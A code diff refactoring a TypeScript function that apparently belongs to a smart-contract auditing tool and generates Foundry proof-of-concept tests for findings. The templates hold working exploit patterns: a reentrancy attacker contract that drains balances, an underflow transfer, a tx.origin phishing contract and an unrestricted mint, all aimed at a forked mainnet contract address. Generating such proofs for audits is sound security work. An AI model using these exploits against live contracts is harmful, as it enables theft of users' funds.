@@ -361,124 +361,133 @@ export function generateFoundryPoC(
   contractAddress: string,
 ): string {
   const t = findingTitle.toLowerCase()
+  const header = [
+    "// SPDX-License-Identifier: MIT",
+    'pragma solidity ^0.8.20;',
+    'import "forge-std/Test.sol";',
+    "",
+  ].join("\n")
 
-  if (t.includes("reentrancy")) return \`// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "forge-std/Test.sol";
+  if (t.includes("reentrancy")) {
+    return [
+      header,
+      "// Solay39 PoC - Reentrancy",
+      "// Finding: " + findingTitle,
+      "// Target: " + contractName + " @ " + contractAddress,
+      "",
+      "interface ITarget { function withdraw() external; function deposit() external payable; }",
+      "",
+      "contract ReentrancyAttacker {",
+      "    ITarget public target;",
+      "    uint public depth;",
+      "    constructor(address t) { target = ITarget(t); }",
+      "    receive() external payable {",
+      "        if (depth++ < 5) target.withdraw();",
+      "    }",
+      "    function attack() external payable {",
+      "        target.deposit{value: msg.value}();",
+      "        target.withdraw();",
+      "    }",
+      "}",
+      "",
+      "contract ReentrancyTest is Test {",
+      "    function testExploit() public {",
+      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        ReentrancyAttacker atk = new ReentrancyAttacker(" + contractAddress + ");",
+      "        uint before = address(" + contractAddress + ").balance;",
+      "        atk.attack{value: 1 ether}();",
+      '        assertLt(address(' + contractAddress + ').balance, before, "Reentrancy drained funds");',
+      "    }",
+      "}",
+    ].join("\n")
+  }
 
-// Solay39 PoC — Reentrancy
-// Finding: \${findingTitle}
-// Target: \${contractName} @ \${contractAddress}
+  if (t.includes("overflow") || t.includes("underflow")) {
+    return [
+      header,
+      "// Solay39 PoC - Integer Overflow/Underflow",
+      "// Finding: " + findingTitle,
+      "// Target: " + contractName + " @ " + contractAddress,
+      "",
+      "interface IToken { function transfer(address, uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }",
+      "",
+      "contract OverflowTest is Test {",
+      "    function testExploit() public {",
+      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        IToken token = IToken(" + contractAddress + ");",
+      '        address attacker = makeAddr("attacker");',
+      "        vm.prank(attacker);",
+      "        token.transfer(address(this), type(uint256).max);",
+      '        assertGt(token.balanceOf(attacker), 1e30, "Underflow confirmed");',
+      "    }",
+      "}",
+    ].join("\n")
+  }
 
-interface ITarget { function withdraw() external; function deposit() external payable; }
+  if (t.includes("tx.origin")) {
+    return [
+      header,
+      "// Solay39 PoC - tx.origin Phishing",
+      "// Finding: " + findingTitle,
+      "// Target: " + contractName + " @ " + contractAddress,
+      "",
+      "interface ITarget { function adminFunction() external; }",
+      "",
+      "contract PhishingContract {",
+      "    ITarget public target;",
+      "    constructor(address t) { target = ITarget(t); }",
+      "    function lure() external { target.adminFunction(); }",
+      "}",
+      "",
+      "contract TxOriginTest is Test {",
+      "    function testExploit() public {",
+      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        address owner = address(0x1234);",
+      "        PhishingContract phisher = new PhishingContract(" + contractAddress + ");",
+      "        vm.prank(owner, owner);",
+      "        phisher.lure();",
+      "    }",
+      "}",
+    ].join("\n")
+  }
 
-contract ReentrancyAttacker {
-    ITarget public target;
-    uint public depth;
-    constructor(address t) { target = ITarget(t); }
-    receive() external payable {
-        if (depth++ < 5) target.withdraw();
-    }
-    function attack() external payable {
-        target.deposit{value: msg.value}();
-        target.withdraw();
-    }
-}
-
-contract ReentrancyTest is Test {
-    function testExploit() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
-        ReentrancyAttacker atk = new ReentrancyAttacker(\${contractAddress});
-        uint before = address(\${contractAddress}).balance;
-        atk.attack{value: 1 ether}();
-        assertLt(address(\${contractAddress}).balance, before, "Reentrancy drained funds");
-    }
-}\`
-
-  if (t.includes("overflow") || t.includes("underflow")) return \`// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "forge-std/Test.sol";
-
-// Solay39 PoC — Integer Overflow/Underflow
-// Finding: \${findingTitle}
-// Target: \${contractName} @ \${contractAddress}
-
-interface IToken { function transfer(address, uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }
-
-contract OverflowTest is Test {
-    function testExploit() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
-        IToken token = IToken(\${contractAddress});
-        address attacker = makeAddr("attacker");
-        vm.prank(attacker);
-        token.transfer(address(this), type(uint256).max);
-        assertGt(token.balanceOf(attacker), 1e30, "Underflow confirmed");
-    }
-}\`
-
-  if (t.includes("tx.origin")) return \`// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "forge-std/Test.sol";
-
-// Solay39 PoC — tx.origin Phishing
-// Finding: \${findingTitle}
-// Target: \${contractName} @ \${contractAddress}
-
-interface ITarget { function adminFunction() external; }
-
-contract PhishingContract {
-    ITarget public target;
-    constructor(address t) { target = ITarget(t); }
-    function lure() external { target.adminFunction(); }
-}
-
-contract TxOriginTest is Test {
-    function testExploit() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
-        address owner = address(0x1234);
-        PhishingContract phisher = new PhishingContract(\${contractAddress});
-        vm.prank(owner, owner);
-        phisher.lure();
-    }
-}\`
-
-  if (t.includes("mint") && t.includes("unrestricted")) return \`// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "forge-std/Test.sol";
-
-// Solay39 PoC — Unrestricted Mint
-// Finding: \${findingTitle}
-// Target: \${contractName} @ \${contractAddress}
-
-interface IToken { function mint(address, uint256) external; function totalSupply() external view returns (uint256); }
-
-contract UnrestrictedMintTest is Test {
-    function testExploit() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
-        IToken token = IToken(\${contractAddress});
-        address attacker = makeAddr("attacker");
-        uint256 before = token.totalSupply();
-        vm.prank(attacker);
-        token.mint(attacker, 1_000_000_000 ether);
-        assertGt(token.totalSupply(), before, "Unrestricted mint confirmed");
-    }
-}\`
+  if (t.includes("mint") && t.includes("unrestricted")) {
+    return [
+      header,
+      "// Solay39 PoC - Unrestricted Mint",
+      "// Finding: " + findingTitle,
+      "// Target: " + contractName + " @ " + contractAddress,
+      "",
+      "interface IToken { function mint(address, uint256) external; function totalSupply() external view returns (uint256); }",
+      "",
+      "contract UnrestrictedMintTest is Test {",
+      "    function testExploit() public {",
+      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        IToken token = IToken(" + contractAddress + ");",
+      '        address attacker = makeAddr("attacker");',
+      "        uint256 before = token.totalSupply();",
+      "        vm.prank(attacker);",
+      "        token.mint(attacker, 1_000_000_000 ether);",
+      '        assertGt(token.totalSupply(), before, "Unrestricted mint confirmed");',
+      "    }",
+      "}",
+    ].join("\n")
+  }
 
   // Generic template
-  return \`// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "forge-std/Test.sol";
-
-// Solay39 PoC — \${findingTitle}
-// Target: \${contractName} @ \${contractAddress}
-
-contract PoCTest is Test {
-    function testExploit() public {
-        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
-        // TODO: implement exploit for: \${findingTitle}
-        // 1. Setup attack conditions
-        // 2. Execute vulnerability
-        // 3. Assert impact (balance / state change)
-    }
-}\`
+  return [
+    header,
+    "// Solay39 PoC - " + findingTitle,
+    "// Target: " + contractName + " @ " + contractAddress,
+    "",
+    "contract PoCTest is Test {",
+    "    function testExploit() public {",
+    '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+    "        // TODO: implement exploit for: " + findingTitle,
+    "        // 1. Setup attack conditions",
+    "        // 2. Execute vulnerability",
+    "        // 3. Assert impact (balance / state change)",
+    "    }",
+    "}",
+  ].join("\n")
 }
